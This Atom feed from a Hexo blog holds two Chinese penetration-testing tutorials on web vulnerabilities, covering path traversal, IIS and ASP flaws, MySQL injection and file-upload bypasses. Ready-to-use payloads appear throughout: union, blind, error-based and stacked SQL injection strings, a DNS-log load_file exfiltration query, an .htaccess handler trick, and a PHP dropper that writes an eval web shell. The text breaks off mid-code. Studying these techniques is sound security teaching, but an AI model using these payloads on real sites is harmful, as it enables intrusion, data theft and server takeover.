<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://ink-scholar.github.io/atom.xml" rel="self"/>
  
  <link href="https://ink-scholar.github.io/"/>
  <updated>2024-02-19T16:34:06.956Z</updated>
  <id>https://ink-scholar.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透测试--WEB攻防(下)</title>
    <link href="https://ink-scholar.github.io/2024/02/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8B)/"/>
    <id>https://ink-scholar.github.io/2024/02/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8B)/</id>
    <published>2024-02-19T14:41:45.562Z</published>
    <updated>2024-02-19T16:34:06.956Z</updated>
    
    <content type="html"><![CDATA[<p><em><strong>此篇主要写一些常规漏洞方面的知识，从不同的漏洞类型讲解</strong></em></p><h1 id="文件-目录安全"><a href="#文件-目录安全" class="headerlink" title="文件&#x2F;目录安全"></a>文件&#x2F;目录安全</h1><p>在文件下载中，常规下载URL：<a href="http://xxxxx/upload/123.pdf">http://xxxxx/upload/123.pdf</a> ， 可能存在安全问题URL：<a href="http://xxxxxx/xx.xx?file=123.pdf">http://xxxxxx/xx.xx?file=123.pdf</a></p><p>第一种常规下载除了下载之外更常见的是解析文件，而第二种通常就是下载，如果有任意文件下载漏洞，可以下载一些敏感文件（数据库配置，中间件配置，系统密匙等文件信息），通过 ..&#x2F; 跳转，除了任意文件下载还有任意文件读取，方法是一模一样的</p><p>除此之外还有文件删除，不过最好别测，方法是一样的</p><p>关于目录的安全问题主要有目录遍历和目录穿越</p><p>目录遍历就是看到一些目录结构和内容，一般是权限分配不当造成的，为什么有些地方可以遍历而有些地方不行？是因为不行的地方存在诸如index.php这样的索引文件，所以你访问目录的时候优先访问到index</p><p>目录穿越就是通过 ..&#x2F; 跳转，跳到其他目录，比如跳到根目录这种</p><p>黑盒分析可以通过以下几点：<br>1、功能点<br>文件上传，文件下载，文件删除，文件管理器等地方<br>2、URL 特征–文件名<br>download，down，readfile，read，del，dir，path，src，Lang 等<br>3、参数名<br>file、path、data、filepath、readfile、data、url、realpath 等<br>白盒分析可以看一些函数特征：<br>上传类函数，删除类函数，下载类函数，目录操作函数，读取查看函数等</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;此篇主要写一些常规漏洞方面的知识，从不同的漏洞类型讲解&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;文件-目录安全&quot;&gt;&lt;a href=&quot;#文件-目录安全&quot; class=&quot;headerlink&quot; title=&quot;文件&amp;#x2F;目录安全&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="攻防" scheme="https://ink-scholar.github.io/tags/%E6%94%BB%E9%98%B2/"/>
    
    <category term="WEB" scheme="https://ink-scholar.github.io/tags/WEB/"/>
    
    <category term="漏洞" scheme="https://ink-scholar.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--WEB攻防(上)</title>
    <link href="https://ink-scholar.github.io/2024/02/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8A)/"/>
    <id>https://ink-scholar.github.io/2024/02/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8A)/</id>
    <published>2024-02-17T08:41:39.660Z</published>
    <updated>2024-02-19T16:38:39.707Z</updated>
    
    <content type="html"><![CDATA[<p><em><strong>此篇主要写一些常规漏洞方面的知识，从不同的语言特性去讲解</strong></em></p><h1 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h1><p>大部分ASP程序与ACCESS数据库搭建，但ACCESS无需连接，都在脚本文件中定义配置好数据库路径即用，不需要额外配置安装数据库，所以大部分提前固定好的数据库路径如默认的，当攻击者知道完整路径，就可以远程下载后解密数据，数据库在网站目录里</p><p>比如我们知道了一个网站采用默认搭建后数据库的地址，直接访问就可以下载数据库文件，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxxxx/database/%23data.mdb</span><br></pre></td></tr></table></figure><p>%23通过url编码后为#</p><h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><h3 id="CVE-2015-1635"><a href="#CVE-2015-1635" class="headerlink" title="CVE-2015-1635"></a>CVE-2015-1635</h3><p>HTTP.SYS漏洞，当它未正确分析经特殊设计的HTTP请求时会导致此漏洞，简单点就是蓝屏打崩，影响系统版本一直到Windows Server 2012 R2，操作系统需要安装IIS 6.0以上，漏洞复现通过msf实现，使用以下模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/dos/http/ms15_034_ulonglongadd</span><br></pre></td></tr></table></figure><h3 id="IIS短文件"><a href="#IIS短文件" class="headerlink" title="IIS短文件"></a>IIS短文件</h3><p>实际是由HTTP请求中旧DOS 8.3名称约定（SFN）的代字符（波浪号）引起的。允许远程攻击者在web根目录下公开文件和文件夹名称（不应该被访问）从而获取有关应用程序基础结构的信息。成因是为了兼容16位MS-DOS程序，Windows为文件名较长的文件和文件夹生成了对应的windows 8.3短文件名。在windows下可以通过 dir &#x2F;x 查看对应的短文件名</p><p>利用工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/irsdl/IIS-ShortName-Scanner</span><br><span class="line">https://github.com/lijiejie/IIS_shortname_Scanner</span><br></pre></td></tr></table></figure><h3 id="IIS文件解析"><a href="#IIS文件解析" class="headerlink" title="IIS文件解析"></a>IIS文件解析</h3><p>IIS 6 解析漏洞：</p><p>1、默认会将 <strong>*.asp;.jpg</strong> 此种格式的文件名，当成Asp解析</p><p>2、默认会将 <strong>*.asp&#x2F;</strong> 目录下的所有文件当成Asp解析</p><p>IIS 7.x 解析漏洞：</p><p>在一个文件路径（**&#x2F;xx.jpg**）后面加上 <strong>&#x2F;xx.php</strong> 会将 <strong>&#x2F;xx.jpg&#x2F;xx.php</strong> 解析为php文件</p><h3 id="IIS写入"><a href="#IIS写入" class="headerlink" title="IIS写入"></a>IIS写入</h3><p>这个利用条件非常苛刻，具体可以参考： <a href="https://cloud.tencent.com/developer/article/2050105">https://cloud.tencent.com/developer/article/2050105</a></p><p>IIS&lt;&#x3D;6.0，目录权限开启写入，开启WebDAV，设置为允许，可以通过PUT请求直接写入</p><h2 id="ACCESS数据库注入"><a href="#ACCESS数据库注入" class="headerlink" title="ACCESS数据库注入"></a>ACCESS数据库注入</h2><p>ACCESS数据库无管理账号密码，顶级架构为表名列名数据，所以在注入时一般采用字典猜解表和列再获取数据，access数据库目前已经很少了，直接使用sqlmap跑吧，具体使用方法网上太多了，自行查阅</p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="Mysql数据库注入"><a href="#Mysql数据库注入" class="headerlink" title="Mysql数据库注入"></a>Mysql数据库注入</h2><p>服务器安装 MYSQL 数据库，搭建多个站点，数据库集中存储 MYSQL 数据库中管理，可以都使用 root 用户管理，也可以创建多个用户进行每个网站对应的数据库管理，也就是说，root用户可以看到这个连接里面所有的数据库，而其他用户只能看到自己创建的数据库和默认自带的数据库</p><h3 id="数据获取"><a href="#数据获取" class="headerlink" title="数据获取"></a>数据获取</h3><p>1、数据库版本-看是否符合 information_schema 查询：<strong>version()</strong><br>2、数据库用户-看是否符合 ROOT 型注入攻击：<strong>user()</strong><br>3、当前操作系统-看是否支持大小写或文件路径选择：**@@version_compile_os**<br>4、数据库名字-为后期猜解指定数据库下的表，列做准备：<strong>database()</strong></p><p>MYSQL5.0 以上版本：自带数据库 <strong>information_schema</strong><br>information_schema：存储数据库下的数据库名及表名，列名信息的数据库<br>information_schema.schemata：记录数据库名信息的表<br>information_schema.tables：记录表名信息的表<br>information_schema.columns：记录列名信息的表<br>schema_name：information_schema.schemata 记录数据库名信息的字段<br>table_schema：information_schema.tables 记录数据库名的字段<br>table_name：information_schema.tables 记录表名的字段<br>column_name：information_schema.columns 记录列名的字段</p><p>简单的sql注入的语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">6</span> # 通过<span class="keyword">order</span> <span class="keyword">by</span> 来看有几个字段，这里<span class="number">6</span>正常<span class="number">7</span>错误，所以当前表中有六个字段</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> # 通过输出<span class="number">1</span><span class="number">-6</span>来看那几个位置的值可以被回显在页面上</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,database(),<span class="keyword">user</span>(),<span class="number">6</span> #这里<span class="number">4</span>和<span class="number">5</span>这两个位置可以正常回显，查看当前数据库名和用户名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,version(),@<span class="variable">@version_compile_os</span>,<span class="number">6</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,group_concat(table_name),<span class="number">6</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;demo01&#x27;</span></span><br><span class="line">#查看demo01这个数据库中的所有表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,group_concat(column_name),<span class="number">6</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;demo01&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">#查看demo01数据库中admin表的所有字段名</span><br><span class="line">id <span class="operator">=</span> <span class="number">1.111</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,username,<span class="number">6</span> <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span>; # 查看admin表中username字段第一个值，多个值的话通过limit来控制，比如查看第二个值，limit <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="跨库注入"><a href="#跨库注入" class="headerlink" title="跨库注入"></a>跨库注入</h3><p>通过B网站的注入点获取A网站的数据，前提需要是root用户权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,group_concat(schema_name),<span class="number">6</span> <span class="keyword">from</span> information_schema.schemata;# 查看所有数据库名</span><br></pre></td></tr></table></figure><p>其他步骤基本一样，只是在最后查询数据时需要加上数据库名这个条件，如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1.111</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,username,<span class="number">6</span> <span class="keyword">from</span> Adb.admin limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><p>需要root权限的用户，还需要没有进行secure-file-priv的设置，高版本默认将它设置死了，所以这个利用点就很少了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,load_file(<span class="string">&#x27;d:\\1.txt&#x27;</span>),<span class="number">6</span>; #读取绝对路径下的文件内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="string">&#x27;写入的内容&#x27;</span>,<span class="number">6</span> <span class="keyword">into</span> outfile <span class="string">&#x27;D:\\1.txt&#x27;</span>; #将内容写入指定的绝对路径</span><br></pre></td></tr></table></figure><p>但是如果我们想要访问到我们写入的文件，就必须知道网站的绝对路径，一般可以通过网上公开的一些路径读取一些配置文件来获取，获取在一些情况下通过网站报错来获取路径</p><p>mysq可以识别16进制，如果禁用了单引号，可以将内容转为16进制然后前面加上0x即可，不在需要单引号</p><h3 id="数据请求"><a href="#数据请求" class="headerlink" title="数据请求"></a>数据请求</h3><p>SQL 语句由于在黑盒中是无法预知写法的，SQL 注入能成功是需要拼接原 SQL 语句，大部分黑盒能做的就是分析后各种尝试去判断，所以有可能出现有注入但无法注入成功的情况，究其原因大部分都是原 SQL 语句的未知性导致的拼接失败，也就是开发者对于数据类型和 SQL 语句写法（框架写法）导致 SQL 注入拼接失败</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 数字型 (无符号干扰)</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>$id;</span><br><span class="line"># 字符型（有符号干扰）</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span>;</span><br><span class="line"># 搜索型（有多符号干扰）</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="keyword">like</span> <span class="string">&#x27;%$id%&#x27;</span></span><br><span class="line"># 框架型（有各种符号干扰）</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>(<span class="string">&#x27;$id&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> (id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span>);</span><br></pre></td></tr></table></figure><p>全局变量方法：GET、POST、SERVER、FILES、HTTP头等</p><p>User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）<br>Cookie：网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据<br>X-Forwarded-For：简称 XFF 头，它代表客户端，也就是 HTTP 的请求端真实的 IP，通常一些网站的防注入功能会记录请求端真实 IP 地址并写入数据库，是PHP特性<br>Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过来的<br>Host：客户端指定自己想访问的 WEB 服务器的域名&#x2F;IP 地址和端口号</p><h3 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查询</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名 <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br><span class="line">#增加：</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 (`字段名<span class="number">1</span>`,`字段名<span class="number">2</span>`) <span class="keyword">VALUES</span> (<span class="string">&#x27;数据1&#x27;</span>,<span class="string">&#x27;数据2&#x27;</span>)</span><br><span class="line">#删除</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名 <span class="keyword">WHERE</span> id<span class="operator">=</span>$id</span><br><span class="line">#修改</span><br><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">SET</span> id<span class="operator">=</span>$id <span class="keyword">where</span> 条件</span><br></pre></td></tr></table></figure><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注就是在注入过程中，获取的数据不能回显至前端页面，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><p>盲注大致分为以下三类：</p><p>1、基于布尔的 SQL 盲注—逻辑判断，需要有数据库是否正常输出作为标准判断</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#常用函数：regexp,<span class="keyword">like</span>,ascii,<span class="keyword">left</span>,ord,mid</span><br><span class="line"><span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">7</span>;</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;p&#x27;</span>;</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">left</span>(database(),<span class="number">2</span>)<span class="operator">=</span><span class="string">&#x27;pi&#x27;</span>;</span><br><span class="line"><span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;p&#x27;</span>;</span><br><span class="line"><span class="keyword">and</span> substr(database(),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;i&#x27;</span>;</span><br><span class="line"><span class="keyword">and</span> ord(<span class="keyword">left</span>(database(),<span class="number">1</span>))<span class="operator">=</span><span class="number">112</span>;</span><br></pre></td></tr></table></figure><p>2、基于时间的 SQL 盲注—延时判断</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#常用函数：if,sleep</span><br><span class="line"><span class="keyword">and</span> sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">and</span> if(<span class="number">1</span><span class="operator">&gt;</span><span class="number">2</span>,sleep(<span class="number">1</span>),<span class="number">0</span>);</span><br><span class="line"><span class="keyword">and</span> if(<span class="number">1</span><span class="operator">&lt;</span><span class="number">2</span>,sleep(<span class="number">1</span>),<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>3、基于报错的 SQL 盲注—报错回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#常用函数：floor，updatexml，extractvalue</span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> version()),<span class="number">0x7e</span>),<span class="number">1</span>) #<span class="number">0x7e</span>是波浪符</span><br><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br></pre></td></tr></table></figure><p>函数解释：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">like</span> <span class="string">&#x27;ro%&#x27;</span> # 判断ro或ro。。。是否成立</span><br><span class="line">regexp <span class="string">&#x27;qax[a-z]&#x27;</span> #匹配qax或qax。。。（a<span class="operator">-</span>z）</span><br><span class="line">if(条件,<span class="number">5</span>,<span class="number">0</span>) #条件成立返回<span class="number">5</span>否则返回<span class="number">0</span></span><br><span class="line">sleep(<span class="number">5</span>) #延时<span class="number">5</span>秒</span><br><span class="line">mid(a,b,c) #从b位置开始，截取字符串a的c位</span><br><span class="line">substr(a,b,c) #从b位置开始，截取字符串a的c个长度</span><br><span class="line"><span class="keyword">left</span>(a,b) #从左侧截取a的前b位</span><br><span class="line">length(database())<span class="operator">=</span><span class="number">8</span> #库名长度为<span class="number">8</span>位</span><br><span class="line">ord() #返回第一个字符的ascii码</span><br></pre></td></tr></table></figure><p>如果有mysqli_error()这种报错可以优先使用报错注入；如果只返回规定好的内容提示，如果删除成功或者删除失败，这种需要延时注入；如果返回接收的结果，无论正确还是错误，可以使用布尔注入</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p><img src="/2024/02/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8A)/image-20240218214113548.png" alt="image-20240218214113548"></p><p>二次注入无非就是在写入时是一个sql语句，但是代码会通过魔术方法等操作，比如给你的单引号加上\来给你转义掉，但是当它存储到数据库时肯定是没有这个\的，但是当你进行其他操作调用到你个sql语句时，不会调用魔术方法，因此你的单引号生效，造成注入</p><p>举个例子，比如现在有一个用户注册的功能点，我们将用户名写为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select version()),0x7e),1)#</span><br></pre></td></tr></table></figure><p>在进行注册时，为了保证注册成功，代码里使用了魔术方法addslashes()，所以数据库中执行的插入语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (username,password) <span class="keyword">VALUES</span> (<span class="string">&#x27;admin\&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> version()),<span class="number">0x7e</span>),<span class="number">1</span>)#<span class="string">&#x27;,&#x27;</span><span class="number">123456</span><span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure><p>当执行其他操作比如密码重置时，就会对我们的用户名进行查询，执行语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> version()),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><p>此时，造成报错注入，我们称之为二次注入</p><p>黑盒思路：分析功能有添加后对数据操作的地方（功能点），一般很难测出来<br>白盒思路：insert 后进入 select 或 update 的功能的代码块<br>注入条件：插入时有转义函数或配置，后续有利用插入的数据</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条 sql 语句，例如 php 中的 mysqli_multi_query 函数。与之相对应的 mysqli_query()只能执行一条 SQL，所以要想目标存在堆叠注入,在目标主机存在类似于mysqli_multi_query()这样的函数,根据数据库类型决定是否支持多条语句执行</p><p>条件：</p><p>1、目标存在 sql 注入漏洞<br>2、目标未对”;”号进行过滤<br>3、目标中间层查询数据库信息时可同时执行多条 sql 语句<br>支持堆叠数据库：MYSQL MSSQL Postgresql 等</p><p>如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;<span class="keyword">create</span> <span class="keyword">table</span> test(username <span class="type">varchar</span>(<span class="number">255</span>));</span><br></pre></td></tr></table></figure><p>这样就会出现一个新建的表test，有一个username的字段</p><h3 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h3><p>注入条件：ROOT 高权限且支持 load_file()，有部分注入点是没有回显的，所有读取也是没回显的，采用带外</p><p>使用平台： <a href="http://ceye.io/">http://ceye.io</a> ， <a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;//&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;.xxx.dnslog.cn&#x27;</span>)))</span><br></pre></td></tr></table></figure><p>数据会拼接外带</p><p>mysql里面的注入多种多样，比如对值进行了base64编码、传参值为json格式等等，但是本质并没有多大区别，这里推荐过一遍sql-lab的靶场就了解的差不多了</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="原生态"><a href="#原生态" class="headerlink" title="原生态"></a>原生态</h3><p>一定要注意：如果无文件解析漏洞的话，格式解析是一对一的（不能 jpg 解析 php），换句话来说有解析错误配置或后缀解析漏洞时才能实现格式差异解析。文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在语言版本，语言函数，中间件，引用的第三方编辑器等存在缺陷地方配合利用。另外文件上传也有多个存储逻辑，不同的文件存储方案也会给攻击者带来不一样的挑战</p><p>对于前端JS检测，可以看前端代码是否有检测代码或者直接抓包，看检测后缀是否有数据包发过来，没有的话就是JS检测，绕过方式一般为禁用JS或者先上传允许的格式然后抓包修改</p><p>对于Apache，存在一个.htaccess配置文件，当我们上传一个.htaccess文件，内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure><p>这样，你的png后缀的文件就会以php的形式进行解析</p><p>对于针对Content-Type这种类型检测，绕过方法就是直接上传允许的类型，然后抓包改后缀即可</p><p>对于文件头的检测，可以通过图片马的方式绕过，因为检测的是文件头</p><p>对于文件后缀的黑名单检测，只要不在名单里面就可以通过，一般这种会把不合法的后缀替换为空，如果没有循环替换的话，可以通过比如pphphp，这样替换为空的话，就会变成php，依旧可以绕过，或者可以通过大小写绕过（针对于Windows），或者是php3、phtml等后缀，可以通过fuzz方式检测</p><p>由于PHP内核是由C语言实现的，对于PHP版本低于5.3.4，magic_quotes_gpc&#x3D;Off，可以通过00截断，比如在提交时你知道它保存的目录，比如是GET请求，就可以&#x2F;upload&#x2F;1.php%00，这样%00后面的内容就被截断了；如果为POST请求，加上%00之后要选中然后进行URL-decode，或者写一个a，然后在Hex里面找到它，为61，然后修改为00</p><p>对于逻辑方面的绕过，可以通过条件竞争的方式绕过，比如代码逻辑是先上传后检测，所有当文件被上传的同时，只要我们能够访问的这个文件，并且文件中存在访问后立即生成后门的代码，这样即便本身被删除，依旧会有恶意文件存放到这个服务器上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;2.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_REQUEST[2]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过burp的爆破模块，先不断的访问，再不断的上传，选择Null payload，Continue indefinitely，开始爆破即可</p><p>对于二次渲染，可以通过010Editor工具，先上传一张图片，然后将图片下载，通过010打开两张图片，然后对比，然后将恶意代码写到保留的部分即可，或者使用GIF的图片马，一般不会被渲染掉</p><p>对于一些函数漏洞，如move_uploaded_file，需要可控保存的文件名，将文件名改为 shell.php&#x2F;. ，这样就可以绕过</p><h3 id="拓展类"><a href="#拓展类" class="headerlink" title="拓展类"></a>拓展类</h3><p>像Apache HTTPD，有一些文件上传的漏洞，但是很鸡肋，需要满足一些苛刻的条件，可以去vulhub去做做靶场就行，实际环境很难遇到</p><p>还有诸如nginx解析漏洞这些，几乎都是配置问题</p><p>还有一些像是UEditor这种编辑器，也会有一些文件上传的漏洞</p><h3 id="安全架构类"><a href="#安全架构类" class="headerlink" title="安全架构类"></a>安全架构类</h3><p>目录控制：限制执行这种，可以上传但是禁止执行代码</p><p>解码还原：比如将图片进行base64编码，加载时解码还原，一般浏览器中Request URL是data:image&#x2F;png;base64这种，后端代码一般为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 